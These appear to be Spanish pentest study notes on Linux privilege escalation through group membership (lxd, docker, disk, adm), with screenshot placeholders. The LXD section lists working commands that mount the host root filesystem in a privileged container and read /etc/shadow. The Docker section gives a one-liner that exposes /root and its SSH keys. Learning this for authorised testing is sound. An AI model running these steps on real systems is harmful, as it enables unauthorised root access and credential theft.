
## LXC/LXD

LXD es similar a Docker y es el gestor de contenedores de Ubuntu. Tras la instalacion todos los usuarios son añadidos a LXD y su pertenencia puede ser usada para escalar privs creando un contenedor LXD, haciendolo privilegiado y luego accediendo al sistema de archvios del host en /mnt/root

1. Confirmamos la pertenencia al grupo

```
id
```
![[Pasted image 20260917161802.png]]

2. Descomprimimos la imagen Alpine:

```
unzip alpine.zip
```
![[Pasted image 20260917161832.png]]

3. Inicia el proceso de inicializacion de LXD. Elegimos valores por defecto en cada pregunta:

```
lxd init
```
![[Pasted image 20260917161909.png]]

4. Importamos la imagen local:

```
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
![[Pasted image 20260917161936.png]]

5. Iniciamos el contenedor privilegiado con `security.privileged` estableciendolo en `true` para ejecutar el contenedor sin un mapeo UID haciendo que el usuario root del contenedor sea el mismo que el root del host:

```
lxc init alpine r00t -c security.privileged=true
```
![[Pasted image 20260917162040.png]]

6. Montamos el sistema de archivos:

```
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
![[Pasted image 20260917172456.png]]

7. Lanzamos una shell dentro de la instancia del contenedor. Si navegamos al sistema de archivos montados podremos leer contenidos de /root (`/mnt/root/root`) o archivos sensibles `/etc/shadow`

```
lxc start r00t
lxc exec r00t /bin/sh
> id
```
![[Pasted image 20260917172627.png]]

## Docker

Añadir un usuario al grupo docker es esencialmente equivalente a tener acceso a nivel de root al sistema de archivos sin necesidad de contraseña. Los miembros del grupo docker pueden lanzar nuevos contenedores docker

```
docker run -v /root:/mnt -it ubuntu
```

	Este comando crea una nueva instancia de Docker con el directorio /root del sistema de archivos del host montado como un volume

Una vez montado, se inicia y podemos navegar por el directorio montado y recuperar claves SSH o mirar archivos sensibles


## Disk

Los usuarios dentro del grupo disk tienen acceso total a cualquier dispositivo contenido en `/dev`, como `/dev/sda1`, que es típicamente el dispositivo principal usado por el sistema operativo

Un atacante con estos privilegios puede usar `debugfs` para acceder a todo el sistema de archivos con privilegios de nivel root


## ADM

Los miembros del grupo adm pueden leer todos los registros almacenados en `/var/log`

Esto no concede directamente acceso root, pero podría aprovecharse para recopilar datos sensibles almacenados en archivos de registro o para enumerar acciones de usuarios y trabajos cron en ejecución.
